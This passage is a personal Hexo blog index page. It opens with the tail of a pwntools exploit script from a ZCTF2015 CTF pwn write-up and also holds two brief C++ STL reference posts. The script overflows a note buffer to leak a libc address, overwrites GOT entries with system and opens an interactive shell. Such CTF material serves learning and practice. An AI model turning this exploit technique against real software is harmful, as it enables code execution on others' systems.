class="line">    p.recvuntil(<span class="string">':'</span>)</div><div class="line">    p.sendline(title)</div><div class="line">    p.recvuntil(<span class="string">':'</span>)</div><div class="line">    p.sendline(content)</div><div class="line">    <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    payload = (<span class="number">0x100</span> + <span class="number">0x10</span>)*<span class="string">'a'</span>+p64(<span class="number">0</span>)+p64(puts_got - <span class="number">0x70</span>)+<span class="string">'b'</span></div><div class="line">    new(<span class="string">'a'</span>, <span class="string">'aa'</span>, <span class="string">'aaa'</span>)</div><div class="line">    new(<span class="string">'b'</span>, <span class="string">'bb'</span>, <span class="string">'bbb'</span>)</div><div class="line">    editnote(<span class="string">'a'</span>, payload)</div><div class="line">    shownote()</div><div class="line">    p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'content='</span>)</div><div class="line">    buf = p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>] + <span class="string">'\x00\x00'</span></div><div class="line">    puts = u64(buf)</div><div class="line">    <span class="keyword">print</span> puts</div><div class="line">    libc_base = puts - puts_off</div><div class="line">    log.success(<span class="string">'Libc base = '</span> + hex(libc_base))</div><div class="line">    read = libc_base + read_off</div><div class="line">    system = libc_base + system_off</div><div class="line">    new_got = p64(puts) + <span class="string">'a'</span>*<span class="number">24</span>+p64(read)+<span class="string">'a'</span>*<span class="number">40</span>+p64(system)</div><div class="line">    editnote(<span class="string">''</span>,new_got)</div><div class="line">    p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line">    p.interactive()</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/17/ZCTF2015-pwn/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-C-STL-Stack" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/17/C-STL-Stack/">C++ STL Stack</a>
    </h1>
  

        
        <a href="/2017/02/17/C-STL-Stack/" class="archive-article-date">
  	<time datetime="2017-02-17T06:53:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-17</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p>实现了栈的全部功能，(FIFO)数据结构。</p>
<p><code>#include&lt;stack&gt;</code></p>
<h2 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h2><table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">empty()</td>
<td style="text-align:center">是否为空，空返回true</td>
</tr>
<tr>
<td style="text-align:center">pop()</td>
<td style="text-align:center">弹栈</td>
</tr>
<tr>
<td style="text-align:center">push()</td>
<td style="text-align:center">压栈</td>
</tr>
<tr>
<td style="text-align:center">size()</td>
<td style="text-align:center">返回栈元素数目</td>
</tr>
<tr>
<td style="text-align:center">top()</td>
<td style="text-align:center">返回栈顶元素</td>
</tr>
</tbody>
</table>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">STL</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/17/C-STL-Stack/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-C-STL使用目录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/17/C-STL使用目录/">C++ STL使用目录</a>
    </h1>
  

        
        <a href="/2017/02/17/C-STL使用目录/" class="archive-article-date">
  	<time datetime="2017-02-17T06:33:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-17</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>刷PAT甲级时顺便学习了下STL的用法。</p>
<h2 id="STL头文件和容器类"><a href="#STL头文件和容器类" class="headerlink" title="STL头文件和容器类"></a>STL头文件和容器类</h2><table>
<thead>
<tr>
<th style="text-align:center">#include</th>
<th style="text-align:center">Container Class</th>
<th style="text-align:center">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">deque</td>
<td style="text-align:center">deque</td>
<td style="text-align:center">双端队列</td>
</tr>
<tr>
<td style="text-align:center">list</td>
<td style="text-align:center">list</td>
<td style="text-align:center">列表</td>
</tr>
<tr>
<td style="text-align:center">map</td>
<td style="text-align:center"><a href="../../../../2017/02/19/C-STL-Map/">map</a></td>
<td style="text-align:center">映射</td>
</tr>
<tr>
<td style="text-align:center">queue</td>
<td style="text-align:center"><a href="../../../../2017/03/17/C-STL-poriority-queue/">queue, poriority_queue</a></td>
<td style="text-align:center">队列</td>
</tr>
<tr>
<td style="text-align:center">set</td>
<td style="text-align:center"><a href="../../../../2017/2/18/C-STL-Set/">set</a>, multiset</td>
<td style="text-align:center">集合</td>
</tr>
<tr>
<td style="text-align:center">stack</td>
<td style="text-align:center"><a href="../../../../2017/2/17/C-STL-Stack/">stack</a></td>
<td style="text-align:center">栈</td>
</tr>
<tr>
<td style="text-align:center">vector</td>
<td style="text-align:center">vector</td>
<td style="text-align:center">变长数组</td>
</tr>
</tbody>
</table>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">STL</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/17/C-STL使用目录/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
    </nav>
  


          </div>
        </div>
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2017 Ree He
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    <script>
	var yiliaConfig = {
		mathjax: false,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		root: "/",
		innerArchive: true,
		showTags: false
	}
</script>

<script>!function(t){function n(r){if(e[r])return e[r].exports;var o=e[r]={exports:{},id:r,loaded:!1};return t[r].call(o.exports,o,o.exports,n),o.loaded=!0,o.exports}var e={};return n.m=t,n.c=e,n.p="./",n(0)}([function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}function o(t,n){var e=/\/|index.html/g;return t.replace(e,"")===n.replace(e,"")}function i(){for(var t=document.querySelectorAll(".js-header-menu li a"),n=window.location.pathname,e=0,r=t.length;e<r;e++){var i=t[e];o(n,i.getAttribute("href"))&&(0,d.default)(i,"active")}}function u(t){for(var n=t.offsetLeft,e=t.offsetParent;null!==e;)n+=e.offsetLeft,e=e.offsetParent;return n}function f(t){for(var n=t.offsetTop,e=t.offsetParent;null!==e;)n+=e.offsetTop,e=e.offsetParent;return n}function c(t,n,e,r,o){var i=u(t),c=f(t)-n;if(c-e<=o){var a=t.$newDom;a||(a=t.cloneNode(!0),(0,h.default)(t,a),t.$newDom=a,a.style.position="fixed",a.style.top=(e||c)+"px",a.style.left=i+"px",a.style.zIndex=r||2,a.style.width="100%",a.style.color="#fff"),a.style.visibility="visible",t.style.visibility="hidden"}else{t.style.visibility="visible";var s=t.$newDom;s&&(s.style.visibility="hidden")}}function a(){var t=document.querySelector(".js-overlay"),n=document.querySelector(".js-header-menu");c(t,document.body.scrollTop,-63,2,0),c(n,document.body.scrollTop,1,3,0)}function s(){document.querySelector("#container").addEventListener("scroll",function(t){a()}),window.addEventListener("scroll",function(t){a()}),a()}function l(){x.default.versions.mobile&&window.screen.width<800&&(i(),s())}var p=e(71),d=r(p),v=e(72),y=(r(v),e(84)),h=r(y),b=e(69),x=r(b),m=e(75),g=r(m),w=e(70);l(),(0,w.addLoadEvent)(function(){g.default.init()}),t.exports={}},function(t,n){var e=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=e)},function(t,n){var e={}.hasOwnProperty;t.exports=function(t,n){return e.call(t,n)}},function(t,n,e){var r=e(49),o=e(15);t.exports=function(t){return r(o(t))}},function(t,n,e){t.exports=!e(8)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,e){var r=e(6),o=e(12);t.exports=e(4)?function(t,n,e){return r.f(t,n,o(1,e))}:function(t,n,e){return t[n]=e,t}},function(t,n,e){var r=e(10),o=e(30),i=e(24),u=Object.defineProperty;n.f=e(4)?Object.defineProperty:function(t,n,e){if(r(t),n=i(n,!0),r(e),o)try{return u(t,n,e)}catch(t){}if("get"in e||"set"in e)throw TypeError("Accessors not supported!");return"value"in e&&(t[n]=e.value),t}},function(t,n,e){var r=e(22)("wks"),o=e(13),i=e(1).Symbol,u="function"==typeof i,f=t.exports=function(t){return r[t]||(r[t]=u&&i[t]||(u?i:o)("Symbol."+t))};f.store=r},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n,e){var r=e(35),o=e(16);t.exports=Object.keys||function(t){return r(t,o)}},function(t,n,e){var r=e(11);t.exports=function(t){if(!r(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var e=0,r=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++e+r).toString(36))}},function(t,n){var e=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=e)},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){t.exports=!0},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,e){var r=e(6).f,o=e(2),i=e(7)("toStringTag");t.exports=function(t,n,e){t&&!o(t=e?t:t.prototype,i)&&r(t,i,{configurable:!0,value:n})}},function(t,n,e){var r=e(22)("keys"),o=e(13);t.exports=function(t){return r[t]||(r[t]=o(t))}},function(t,n,e){var r=e(1),o="__core-js_shared__",i=r[o]||(r[o]={});t.exports=function(t){return i[t]||(i[t]={})}},function(t,n){var e=Math.ceil,r=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(t>0?r:e)(t)}},function(t,n,e){var r=e(11);t.exports=function(t,n){if(!r(t))return t;var e,o;if(n&&"function"==typeof(e=t.toString)&&!r(o=e.call(t)))return o;if("function"==typeof(e=t.valueOf)&&!r(o=e.call(t)))return o;if(!n&&"function"==typeof(e=t.toString)&&!r(o=e.call(t)))return o;throw TypeError("Can't convert object to primitive value")}},function(t,n,e){var r=e(1),o=e(14),i=e(18),u=e(26),f=e(6).f;t.exports=function(t){var n=o.Symbol||(o.Symbol=i?{}:r.Symbol||{});"_"==t.charAt(0)||t in n||f(n,t,{value:u.f(t)})}},function(t,n,e){n.f=e(7)},function(t,n,e){var r=e(1),o=e(14),i=e(46),u=e(5),f="prototype",c=function(t,n,e){var a,s,l,p=t&c.F,d=t&c.G,v=t&c.S,y=t&c.P,h=t&c.B,b=t&c.W,x=d?o:o[n]||(o[n]={}),m=x[f],g=d?r:v?r[n]:(r[n]||{})[f];d&&(e=n);for(a in e)s=!p&&g&&void 0!==g[a],s&&a in x||(l=s?g[a]:e[a],x[a]=d&&"function"!=typeof g[a]?e[a]:h&&s?i(l,r):b&&g[a]==l?function(t){var n=function(n,e,r){if(this instanceof t){switch(arguments.length){case 0:return new t;case 1:return new t(n);case 2:return new t(n,e)}return new t(n,e,r)}return t.apply(this,arguments)};return n[f]=t[f],n}(l):y&&"function"==typeof l?i(Function.call,l):l,y&&((x.virtual||(x.virtual={}))[a]=l,t&c.R&&m&&!m[a]&&u(m,a,l)))};c.F=1,c.G=2,c.S=4,c.P=8,c.B=16,c.W=32,c.U=64,c.R=128,t.exports=c},function(t,n){var e={}.toString;t.exports=function(t){return e.call(t).slice(8,-1)}},function(t,n,e){var r=e(11),o=e(1).document,i=r(o)&&r(o.createElement);t.exports=function(t){return i?o.createElement(t):{}}},function(t,n,e){t.exports=!e(4)&&!e(8)(function(){return 7!=Object.defineProperty(e(29)("div"),"a",{get:function(){return 7}}).a})},function(t,n,e){"use strict";var r=e(18),o=e(27),i=e(36),u=e(5),f=e(2),c=e(17),a=e(51),s=e(20),l=e(58),p=e(7)("iterator"),d=!([].keys&&"next"in[].keys()),v="@@iterator",y="keys",h="values",b=function(){return this};t.exports=function(t,n,e,x,m,g,w){a(e,n,x);var O,S,_,j=function(t){if(!d&&t in A)return A[t];switch(t){case y:return function(){return new e(this,t)};case h:return function(){return new e(this,t)}}return function(){return new e(this,t)}},P=n+" Iterator",E=m==h,M=!1,A=t.prototype,T=A[p]||A[v]||m&&A[m],L=T||j(m),N=m?E?j("entries"):L:void 0,C="Array"==n?A.entries||T:T;if(C&&(_=l(C.call(new t)),_!==Object.prototype&&(s(_,P,!0),r||f(_,p)||u(_,p,b))),E&&T&&T.name!==h&&(M=!0,L=function(){return T.call(this)}),r&&!w||!d&&!M&&A[p]||u(A,p,L),c[n]=L,c[P]=b,m)if(O={values:E?L:j(h),keys:g?L:j(y),entries:N},w)for(S in O)S in A||i(A,S,O[S]);else o(o.P+o.F*(d||M),n,O);return O}},function(t,n,e){var r=e(10),o=e(55),i=e(16),u=e(21)("IE_PROTO"),f=function(){},c="prototype",a=function(){var t,n=e(29)("iframe"),r=i.length,o="<",u=">";for(n.style.display="none",e(48).appendChild(n),n.src="javascript:",t=n.contentWindow.document,t.open(),t.write(o+"script"+u+"document.F=Object"+o+"/script"+u),t.close(),a=t.F;r--;)delete a[c][i[r]];return a()};t.exports=Object.create||function(t,n){var e;return null!==t?(f[c]=r(t),e=new f,f[c]=null,e[u]=t):e=a(),void 0===n?e:o(e,n)}},function(t,n,e){var r=e(35),o=e(16).concat("length","prototype");n.f=Object.getOwnPropertyNames||function(t){return r(t,o)}},function(t,n){n.f=Object.getOwnPropertySymbols},function(t,n,e){var r=e(2),o=e(3),i=e(45)(!1),u=e(21)("IE_PROTO");t.exports=function(t,n){var e,f=o(t),c=0,a=[];for(e in f)e!=u&&r(f,e)&&a.push(e);for(;n.length>c;)r(f,e=n[c++])&&(~i(a,e)||a.push(e));return a}},function(t,n,e){t.exports=e(5)},function(t,n,e){var r=e(15);t.exports=function(t){return Object(r(t))}},function(t,n,e){t.exports={default:e(41),__esModule:!0}},function(t,n,e){t.exports={default:e(42),__esModule:!0}},function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}n.__esModule=!0;var o=e(39),i=r(o),u=e(38),f=r(u),c="function"==typeof f.default&&"symbol"==typeof i.default?function(t){return typeof t}:function(t){return t&&"function"==typeof f.default&&t.constructor===f.default&&t!==f.default.prototype?"symbol":typeof t};n.default="function"==typeof f.default&&"symbol"===c(i.default)?function(t){return"undefined"==typeof t?"undefined":c(t)}:function(t){return t&&"function"==typeof f.default&&t.constructor===f.default&&t!==f.default.prototype?"symbol":"undefined"==typeof t?"undefined":c(t)}},function(t,n,e){e(65),e(63),e(66),e(67),t.exports=e(14).Symbol},function(t,n,e){e(64),e(68),t.exports=e(26).f("iterator")},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n){t.exports=function(){}},function(t,n,e){var r=e(3),o=e(61),i=e(60);t.exports=function(t){return function(n,e,u){var f,c=r(n),a=o(c.length),s=i(u,a);if(t&&e!=e){for(;a>s;)if(f=c[s++],f!=f)return!0}else for(;a>s;s++)if((t||s in c)&&c[s]===e)return t||s||0;return!t&&-1}}},function(t,n,e){var r=e(43);t.exports=function(t,n,e){if(r(t),void 0===n)return t;switch(e){case 1:return function(e){return t.call(n,e)};case 2:return function(e,r){return t.call(n,e,r)};case 3:return function(e,r,o){return t.call(n,e,r,o)}}return function(){return t.apply(n,arguments)}}},function(t,n,e){var r=e(9),o=e(34),i=e(19);t.exports=function(t){var n=r(t),e=o.f;if(e)for(var u,f=e(t),c=i.f,a=0;f.length>a;)c.call(t,u=f[a++])&&n.push(u);return n}},function(t,n,e){t.exports=e(1).document&&document.documentElement},function(t,n,e){var r=e(28);t.exports=Object("z").propertyIsEnumerable(0)?Object:function(t){return"String"==r(t)?t.split(""):Object(t)}},function(t,n,e){var r=e(28);t.exports=Array.isArray||function(t){return"Array"==r(t)}},function(t,n,e){"use strict";var r=e(32),o=e(12),i=e(20),u={};e(5)(u,e(7)("iterator"),function(){return this}),t.exports=function(t,n,e){t.prototype=r(u,{next:o(1,e)}),i(t,n+" Iterator")}},function(t,n){t.exports=function(t,n){return{value:n,done:!!t}}},function(t,n,e){var r=e(9),o=e(3);t.exports=function(t,n){for(var e,i=o(t),u=r(i),f=u.length,c=0;f>c;)if(i[e=u[c++]]===n)return e}},function(t,n,e){var r=e(13)("meta"),o=e(11),i=e(2),u=e(6).f,f=0,c=Object.isExtensible||function(){return!0},a=!e(8)(function(){return c(Object.preventExtensions({}))}),s=function(t){u(t,r,{value:{i:"O"+ ++f,w:{}}})},l=function(t,n){if(!o(t))return"symbol"==typeof t?t:("string"==typeof t?"S":"P")+t;if(!i(t,r)){if(!c(t))return"F";if(!n)return"E";s(t)}return t[r].i},p=function(t,n){if(!i(t,r)){if(!c(t))return!0;if(!n)return!1;s(t)}return t[r].w},d=function(t){return a&&v.NEED&&c(t)&&!i(t,r)&&s(t),t},v=t.exports={KEY:r,NEED:!1,fastKey:l,getWeak:p,onFreeze:d}},function(t,n,e){var r=e(6),o=e(10),i=e(9);t.exports=e(4)?Object.defineProperties:function(t,n){o(t);for(var e,u=i(n),f=u.length,c=0;f>c;)r.f(t,e=u[c++],n[e]);return t}},function(t,n,e){var r=e(19),o=e(12),i=e(3),u=e(24),f=e(2),c=e(30),a=Object.getOwnPropertyDescriptor;n.f=e(4)?a:function(t,n){if(t=i(t),n=u(n,!0),c)try{return a(t,n)}catch(t){}if(f(t,n))return o(!r.f.call(t,n),t[n])}},function(t,n,e){var r=e(3),o=e(33).f,i={}.toString,u="object"==typeof window&&window&&Object.getOwnPropertyNames?Object.getOwnPropertyNames(window):[],f=function(t){try{return o(t)}catch(t){return u.slice()}};t.exports.f=function(t){return u&&"[object Window]"==i.call(t)?f(t):o(r(t))}},function(t,n,e){var r=e(2),o=e(37),i=e(21)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=o(t),r(t,i)?t[i]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n,e){var r=e(23),o=e(15);t.exports=function(t){return function(n,e){var i,u,f=String(o(n)),c=r(e),a=f.length;return c<0||c>=a?t?"":void 0:(i=f.charCodeAt(c),i<55296||i>56319||c+1===a||(u=f.charCodeAt(c+1))<56320||u>57343?t?f.charAt(c):i:t?f.slice(c,c+2):(i-55296<<10)+(u-56320)+65536)}}},function(t,n,e){var r=e(23),o=Math.max,i=Math.min;t.exports=function(t,n){return t=r(t),t<0?o(t+n,0):i(t,n)}},function(t,n,e){var r=e(23),o=Math.min;t.exports=function(t){return t>0?o(r(t),9007199254740991):0}},function(t,n,e){"use strict";var r=e(44),o=e(52),i=e(17),u=e(3);t.exports=e(31)(Array,"Array",function(t,n){this._t=u(t),this._i=0,this._k=n},function(){var t=this._t,n=this._k,e=this._i++;return!t||e>=t.length?(this._t=void 0,o(1)):"keys"==n?o(0,e):"values"==n?o(0,t[e]):o(0,[e,t[e]])},"values"),i.Arguments=i.Array,r("keys"),r("values"),r("entries")},function(t,n){},function(t,n,e){"use strict";var r=e(59)(!0);e(31)(String,"String",function(t){this._t=String(t),this._i=0},function(){var t,n=this._t,e=this._i;return e>=n.length?{value:void 0,done:!0}:(t=r(n,e),this._i+=t.length,{value:t,done:!1})})},function(t,n,e){"use strict";var r=e(1),o=e(2),i=e(4),u=e(27),f=e(36),c=e(54).KEY,a=e(8),s=e(22),l=e(20),p=e(13),d=e(7),v=e(26),y=e(25),h=e(53),b=e(47),x=e(50),m=e(10),g=e(3),w=e(24),O=e(12),S=e(32),_=e(57),j=e(56),P=e(6),E=e(9),M=j.f,A=P.f,T=_.f,L=r.Symbol,N=r.JSON,C=N&&N.stringify,k="prototype",F=d("_hidden"),q=d("toPrimitive"),I={}.propertyIsEnumerable,B=s("symbol-registry"),D=s("symbols"),W=s("op-symbols"),H=Object[k],K="function"==typeof L,R=r.QObject,J=!R||!R[k]||!R[k].findChild,U=i&&a(function(){return 7!=S(A({},"a",{get:function(){return A(this,"a",{value:7}).a}})).a})?function(t,n,e){var r=M(H,n);r&&delete H[n],A(t,n,e),r&&t!==H&&A(H,n,r)}:A,G=function(t){var n=D[t]=S(L[k]);return n._k=t,n},$=K&&"symbol"==typeof L.iterator?function(t){return"symbol"==typeof t}:function(t){return t instanceof L},z=function(t,n,e){return t===H&&z(W,n,e),m(t),n=w(n,!0),m(e),o(D,n)?(e.enumerable?(o(t,F)&&t[F][n]&&(t[F][n]=!1),e=S(e,{enumerable:O(0,!1)})):(o(t,F)||A(t,F,O(1,{})),t[F][n]=!0),U(t,n,e)):A(t,n,e)},Y=function(t,n){m(t);for(var e,r=b(n=g(n)),o=0,i=r.length;i>o;)z(t,e=r[o++],n[e]);return t},Q=function(t,n){return void 0===n?S(t):Y(S(t),n)},X=function(t){var n=I.call(this,t=w(t,!0));return!(this===H&&o(D,t)&&!o(W,t))&&(!(n||!o(this,t)||!o(D,t)||o(this,F)&&this[F][t])||n)},V=function(t,n){if(t=g(t),n=w(n,!0),t!==H||!o(D,n)||o(W,n)){var e=M(t,n);return!e||!o(D,n)||o(t,F)&&t[F][n]||(e.enumerable=!0),e}},Z=function(t){for(var n,e=T(g(t)),r=[],i=0;e.length>i;)o(D,n=e[i++])||n==F||n==c||r.push(n);return r},tt=function(t){for(var n,e=t===H,r=T(e?W:g(t)),i=[],u=0;r.length>u;)!o(D,n=r[u++])||e&&!o(H,n)||i.push(D[n]);return i};K||(L=function(){if(this instanceof L)throw TypeError("Symbol is not a constructor!");var t=p(arguments.length>0?arguments[0]:void 0),n=function(e){this===H&&n.call(W,e),o(this,F)&&o(this[F],t)&&(this[F][t]=!1),U(this,t,O(1,e))};return i&&J&&U(H,t,{configurable:!0,set:n}),G(t)},f(L[k],"toString",function(){return this._k}),j.f=V,P.f=z,e(33).f=_.f=Z,e(19).f=X,e(34).f=tt,i&&!e(18)&&f(H,"propertyIsEnumerable",X,!0),v.f=function(t){return G(d(t))}),u(u.G+u.W+u.F*!K,{Symbol:L});for(var nt="hasInstance,isConcatSpreadable,iterator,match,replace,search,species,split,toPrimitive,toStringTag,unscopables".split(","),et=0;nt.length>et;)d(nt[et++]);for(var nt=E(d.store),et=0;nt.length>et;)y(nt[et++]);u(u.S+u.F*!K,"Symbol",{for:function(t){return o(B,t+="")?B[t]:B[t]=L(t)},keyFor:function(t){if($(t))return h(B,t);throw TypeError(t+" is not a symbol!")},useSetter:function(){J=!0},useSimple:function(){J=!1}}),u(u.S+u.F*!K,"Object",{create:Q,defineProperty:z,defineProperties:Y,getOwnPropertyDescriptor:V,getOwnPropertyNames:Z,getOwnPropertySymbols:tt}),N&&u(u.S+u.F*(!K||a(function(){var t=L();return"[null]"!=C([t])||"{}"!=C({a:t})||"{}"!=C(Object(t))})),"JSON",{stringify:function(t){if(void 0!==t&&!$(t)){for(var n,e,r=[t],o=1;arguments.length>o;)r.push(arguments[o++]);return n=r[1],"function"==typeof n&&(e=n),!e&&x(n)||(n=function(t,n){if(e&&(n=e.call(this,t,n)),!$(n))return n}),r[1]=n,C.apply(N,r)}}}),L[k][q]||e(5)(L[k],q,L[k].valueOf),l(L,"Symbol"),l(Math,"Math",!0),l(r.JSON,"JSON",!0)},function(t,n,e){e(25)("asyncIterator")},function(t,n,e){e(25)("observable")},function(t,n,e){e(62);for(var r=e(1),o=e(5),i=e(17),u=e(7)("toStringTag"),f=["NodeList","DOMTokenList","MediaList","StyleSheetList","CSSRuleList"],c=0;c<5;c++){var a=f[c],s=r[a],l=s&&s.prototype;l&&!l[u]&&o(l,u,a),i[a]=i.Array}},function(t,n){"use strict";var e={versions:function(){var t=window.navigator.userAgent;return{trident:t.indexOf("Trident")>-1,presto:t.indexOf("Presto")>-1,webKit:t.indexOf("AppleWebKit")>-1,gecko:t.indexOf("Gecko")>-1&&t.indexOf("KHTML")==-1,mobile:!!t.match(/AppleWebKit.*Mobile.*/),ios:!!t.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),android:t.indexOf("Android")>-1||t.indexOf("Linux")>-1,iPhone:t.indexOf("iPhone")>-1||t.indexOf("Mac")>-1,iPad:t.indexOf("iPad")>-1,webApp:t.indexOf("Safari")==-1,weixin:t.indexOf("MicroMessenger")==-1}}()};t.exports=e},function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}var o=e(40),i=r(o),u=function(){function t(t,n,e){return n||e?String.fromCharCode(n||e):o[t]||t}function n(t){return l[t]}var e=/&quot;|&lt;|&gt;|&amp;|&nbsp;|&apos;|&#(\d+);|&#(\d+)/g,r=/['<> "&]/g,o={"&quot;":'"',"&lt;":"<","&gt;":">","&amp;":"&","&nbsp;":" "},f=/\u00a0/g,c=/<br\s*\/?>/gi,a=/\r?\n/g,s=/\s/g,l={};for(var p in o)l[o[p]]=p;return o["&apos;"]="'",l["'"]="&#39;",{encode:function(t){return t?(""+t).replace(r,n).replace(a,"<br/>").replace(s,"&nbsp;"):""},decode:function(n){return n?(""+n).replace(c,"\n").replace(e,t).replace(f," "):""},encodeBase16:function(t){if(!t)return t;t+="";for(var n=[],e=0,r=t.length;r>e;e++)n.push(t.charCodeAt(e).toString(16).toUpperCase());return n.join("")},encodeBase16forJSON:function(t){if(!t)return t;t=t.replace(/[\u4E00-\u9FBF]/gi,function(t){return escape(t).replace("%u","\\u")});for(var n=[],e=0,r=t.length;r>e;e++)n.push(t.charCodeAt(e).toString(16).toUpperCase());return n.join("")},decodeBase16:function(t){if(!t)return t;t+="";for(var n=[],e=0,r=t.length;r>e;e+=2)n.push(String.fromCharCode("0x"+t.slice(e,e+2)));return n.join("")},encodeObject:function(t){if(t instanceof Array)for(var n=0,e=t.length;e>n;n++)t[n]=u.encodeObject(t[n]);else if("object"==("undefined"==typeof t?"undefined":(0,i.default)(t)))for(var r in t)t[r]=u.encodeObject(t[r]);else if("string"==typeof t)return u.encode(t);return t},loadScript:function(t){var n=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(n),n.setAttribute("src",t)},addLoadEvent:function(t){var n=window.onload;"function"!=typeof window.onload?window.onload=t:window.onload=function(){n(),t()}}}}();t.exports=u},function(t,n){function e(t,n){t.classList?t.classList.add(n):t.className+=" "+n}t.exports=e},function(t,n){function e(t,n){if(t.classList)t.classList.remove(n);else{var e=new RegExp("(^|\\b)"+n.split(" ").join("|")+"(\\b|$)","gi");t.className=t.className.replace(e," ")}}t.exports=e},,,function(t,n){"use strict";function e(){var t=document.querySelector("#page-nav");if(t&&!document.querySelector("#page-nav .extend.prev")&&(t.innerHTML='<a class="extend prev disabled" rel="prev">&laquo; Prev</a>'+t.innerHTML),t&&!document.querySelector("#page-nav .extend.next")&&(t.innerHTML=t.innerHTML+'<a class="extend next disabled" rel="next">Next &raquo;</a>'),yiliaConfig&&yiliaConfig.open_in_new){var n=document.querySelectorAll(".article-entry a:not(.article-more-a)");n.forEach(function(t){t.setAttribute("target","_blank")})}var 